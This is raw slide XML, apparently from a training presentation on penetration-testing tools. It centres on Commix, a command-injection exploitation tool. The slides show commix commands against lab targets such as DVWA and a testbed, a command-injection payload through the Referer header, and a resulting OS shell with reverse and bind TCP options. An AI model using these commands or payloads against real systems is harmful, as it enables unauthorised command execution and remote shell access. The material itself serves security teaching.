              </a:rPr>
              <a:t> Penetration Testers Framework (PTF) </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" u="sng" dirty="0" smtClean="0">
                <a:hlinkClick r:id="rId4"/>
              </a:rPr>
              <a:t>OWASP Offensive Web Testing Framework (OWTF) </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" u="sng" dirty="0" smtClean="0">
                <a:hlinkClick r:id="rId5"/>
              </a:rPr>
              <a:t>CTF-Tools </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" u="sng" dirty="0" err="1" smtClean="0">
                <a:hlinkClick r:id="rId6"/>
              </a:rPr>
              <a:t>PentestBox</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" u="sng" dirty="0" smtClean="0">
                <a:hlinkClick r:id="rId6"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" u="sng" dirty="0" err="1" smtClean="0">
                <a:hlinkClick r:id="rId7"/>
              </a:rPr>
              <a:t>PenBox</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" u="sng" dirty="0" smtClean="0">
                <a:hlinkClick r:id="rId7"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" u="sng" dirty="0" err="1" smtClean="0">
                <a:hlinkClick r:id="rId8"/>
              </a:rPr>
              <a:t>Katoolin</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" u="sng" dirty="0" smtClean="0">
                <a:hlinkClick r:id="rId8"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" u="sng" dirty="0" err="1" smtClean="0">
                <a:hlinkClick r:id="rId9"/>
              </a:rPr>
              <a:t>Aptive's</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" u="sng" dirty="0" smtClean="0">
                <a:hlinkClick r:id="rId9"/>
              </a:rPr>
              <a:t> Penetration Testing tools </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" u="sng" dirty="0" smtClean="0">
                <a:hlinkClick r:id="rId10"/>
              </a:rPr>
              <a:t>Homebrew Tap - Pen Test Tools </a:t>
            </a:r>
            <a:endParaRPr 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solidFill>
                  <a:schemeClr val="accent3"/>
                </a:solidFill>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474536"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="3600" b="1" u="sng" dirty="0" smtClean="0"/>
              <a:t>Supported Platforms</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>Linux </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>Mac OS X </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>Windows (experimental) </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="3200" b="1" u="sng" dirty="0" smtClean="0"/>
              <a:t>Usage</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>To get a list of all options and switches use:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>python commix.py -h</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" u="sng" dirty="0" err="1" smtClean="0">
                <a:hlinkClick r:id="rId3"/>
              </a:rPr>
              <a:t>root@kali</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" u="sng" dirty="0" smtClean="0">
                <a:hlinkClick r:id="rId3"/>
              </a:rPr>
              <a:t>:~# commix -h</a:t>
            </a:r>
          </a:p>
          <a:p>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solidFill>
                  <a:schemeClr val="accent3"/>
                </a:solidFill>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169736"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="77500" lnSpcReduction="20000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="fr-FR" dirty="0" smtClean="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" u="sng" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:hlinkClick r:id="rId3"/>
              </a:rPr>
              <a:t>root</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" u="sng" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:hlinkClick r:id="rId3"/>
              </a:rPr>
              <a:t>@kali:~# </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" u="sng" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:hlinkClick r:id="rId3"/>
              </a:rPr>
              <a:t>commix</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" u="sng" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:hlinkClick r:id="rId3"/>
              </a:rPr>
              <a:t> --url </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" u="sng" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:hlinkClick r:id="rId3"/>
              </a:rPr>
              <a:t>=http</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" u="sng" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:hlinkClick r:id="rId3"/>
              </a:rPr>
              <a:t>://192.168.20.12/dvwa/vulnerabilities/exec/ \</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>root@kali</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>:~# commix --</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>url</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>="http://192.168.0.23/commix-testbed/scenarios/referer/referer(classic).php" –level=3</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t/>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>                                       __</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>   ___    ___     ___ ___     ___ ___ /\_\   __  _</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>  /'___\ / __`\ /' __` __`\ /' __` __`\/\ \ /\ \/'\  v1.7-stable</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> /\ \__//\ \L\ \/\ \/\ \/\ \/\ \/\ \/\ \ \ </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" u="sng" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:hlinkClick r:id="rId4"/>
              </a:rPr>
              <a:t>\\/&gt;  &lt;/</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" u="sng" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:hlinkClick r:id="rId4"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" u="sng" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:hlinkClick r:id="rId4"/>
              </a:rPr>
              <a:t> \ \____\ \____/\ \_\ \_\ \_\ \_\ \_\ \_\ \_\/\_/\_\ </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" u="sng" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:hlinkClick r:id="rId5"/>
              </a:rPr>
              <a:t>http://commixproject.com</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" u="sng" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:hlinkClick r:id="rId5"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" u="sng" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:hlinkClick r:id="rId5"/>
              </a:rPr>
              <a:t>  \/____/\/___/  \/_/\/_/\/_/\/_/\/_/\/_/\/_/\//\/_/ (@</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" u="sng" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:hlinkClick r:id="rId5"/>
              </a:rPr>
              <a:t>commixproject</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" u="sng" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:hlinkClick r:id="rId5"/>
              </a:rPr>
              <a:t>)</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" u="sng" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:hlinkClick r:id="rId5"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" u="sng" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:hlinkClick r:id="rId5"/>
              </a:rPr>
              <a:t/>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" u="sng" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:hlinkClick r:id="rId5"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" u="sng" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:hlinkClick r:id="rId5"/>
              </a:rPr>
              <a:t>+--</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" u="sng" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:hlinkClick r:id="rId5"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" u="sng" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:hlinkClick r:id="rId5"/>
              </a:rPr>
              <a:t>Automated All-in-One OS Command Injection and Exploitation Tool</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" u="sng" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:hlinkClick r:id="rId5"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" u="sng" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:hlinkClick r:id="rId5"/>
              </a:rPr>
              <a:t>Copyright (c) 2014-2017 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" u="sng" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:hlinkClick r:id="rId5"/>
              </a:rPr>
              <a:t>Anastasios</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" u="sng" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:hlinkClick r:id="rId5"/>
              </a:rPr>
              <a:t> Stasinopoulos (@</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" u="sng" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:hlinkClick r:id="rId5"/>
              </a:rPr>
              <a:t>ancst</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" u="sng" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:hlinkClick r:id="rId5"/>
              </a:rPr>
              <a:t>)</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" u="sng" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:hlinkClick r:id="rId5"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" u="sng" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:hlinkClick r:id="rId5"/>
              </a:rPr>
              <a:t>+--</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:solidFill>
                <a:schemeClr val="tx1"/>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pPr algn="ctr"/>
            <a:r>
              <a:rPr lang="en-US" sz="3600" b="1" u="sng" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:schemeClr val="accent3"/>
                </a:solidFill>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474536"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="77500" lnSpcReduction="20000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>[*] Checking connection to the target URL... [ SUCCEED ]</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>[*] Setting the HTTP header User-Agent for tests.</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>[*] Testing the (results-based) classic command injection technique... [ FAILED ]</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>[*] Testing the (results-based) dynamic code evaluation technique... [ FAILED ]</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>[*] Testing the (blind) time-based command injection technique... [ FAILED ]</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>[*] Trying to create a file in '/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1" smtClean="0"/>
              <a:t>var</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>/www/html/commix-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1" smtClean="0"/>
              <a:t>testbed</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>/scenarios/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1" smtClean="0"/>
              <a:t>referer</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>/'...</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>[!] Warning: It seems that you don't have permissions to read and/or write files in '/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1" smtClean="0"/>
              <a:t>var</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>/www/html/commix-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1" smtClean="0"/>
              <a:t>testbed</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>/scenarios/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1" smtClean="0"/>
              <a:t>referer</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>/'.</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>[?] Do you want to try the temporary directory (/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1" smtClean="0"/>
              <a:t>tmp</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>/) [Y/n] &gt; Y</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>[*] Trying to create a file, in temporary directory (/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1" smtClean="0"/>
              <a:t>tmp</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>/)...</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>[*] Testing the (semi-blind) </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1" smtClean="0"/>
              <a:t>tempfile</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>-based injection technique... [ FAILED ]</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>[!] Warning: The tested HTTP header User-Agent seems to be not </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1" smtClean="0"/>
              <a:t>injectable</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>.</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>[*] Setting the HTTP header </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1" smtClean="0"/>
              <a:t>Referer</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t> for tests.</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>[*] Testing the (results-based) classic command injection technique... [ SUCCEED ]</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>[+] The HTTP header </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1" smtClean="0"/>
              <a:t>Referer</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t> seems </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1" smtClean="0"/>
              <a:t>injectable</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t> via (results-based) classic command injection technique.</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>    [~] Payload: ';echo KSXTLU$((18+64))$(echo KSXTLU)KSXTLU'</a:t>
            </a:r>
          </a:p>
          <a:p>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Shape 1"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="838080" y="365040"/>
            <a:ext cx="10515240" cy="1325160"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr lIns="0" tIns="0" rIns="0" bIns="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr lang="en-US" sz="1800" b="0" strike="noStrike" spc="-1">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Title 4"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="ctrTitle"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="3600" b="1" u="sng" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:schemeClr val="accent3"/>
                </a:solidFill>
                <a:hlinkClick r:id="rId2"/>
              </a:rPr>
              <a:t>Commix: Penetration Testing /Exploitation Tools</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Subtitle 5"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="subTitle" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1910080" y="1850064"/>
            <a:ext cx="9875520" cy="4703136"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="62500" lnSpcReduction="20000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>[?] Do you want a Pseudo-Terminal shell? [Y/n] &gt; Y</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t/>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>Pseudo-Terminal (type '?' for available options)</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>commix(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1" smtClean="0"/>
              <a:t>os_shell</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>) &gt; ?</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t/>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>  ---[ Available options ]---</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>  Type '?' to get all the available options.</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>  Type 'back' to move back from the current context.</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>  Type 'quit' (or use &lt;Ctrl-C&gt;) to quit commix.</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>  Type '</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1" smtClean="0"/>
              <a:t>reverse_tcp</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>' to get a reverse TCP connection.</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>  Type '</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1" smtClean="0"/>
              <a:t>bind_tcp</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>' to set a bind TCP connection.</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t/>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>commix(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1" smtClean="0"/>
              <a:t>os_shell</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>) &gt; id</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t/>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1" smtClean="0"/>
              <a:t>uid</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>=33(www-data) </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1" smtClean="0"/>
              <a:t>gid</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>=33(www-data) groups=33(www-data)</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t/>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>commix(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1" smtClean="0"/>
              <a:t>os_shell</a:t>
